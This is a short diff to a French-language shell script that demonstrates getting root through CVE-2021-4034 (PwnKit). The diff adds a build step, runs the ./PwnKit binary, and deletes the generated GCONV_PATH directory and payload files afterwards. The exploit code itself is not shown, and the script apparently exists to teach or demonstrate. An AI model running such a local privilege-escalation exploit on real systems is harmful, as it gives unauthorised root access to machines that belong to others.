@@ -7,6 +7,7 @@ C='\033[44m'
 E='\033[32m\033[1m'
 W='\033[31m\033[1m'
 N='\033[0m'
+make
 clear
 echo "Démonstration de la faille de sécurité permettant de passer en root"
 echo "----------------------------------------"
@@ -16,6 +17,11 @@ id
 echo
 echo -e "${E}Exécution du programme : exit pour quitter le bash ${N}"
 echo
-./cve-2021-4034
+./PwnKit
 echo -e "${E}Supression des dossiers générés : ${N}"
+rm -rf GCONV_PATH=.
+rm payload.c
+rm payload.so
+rm PwnKit
+rm -rf unfichier
 
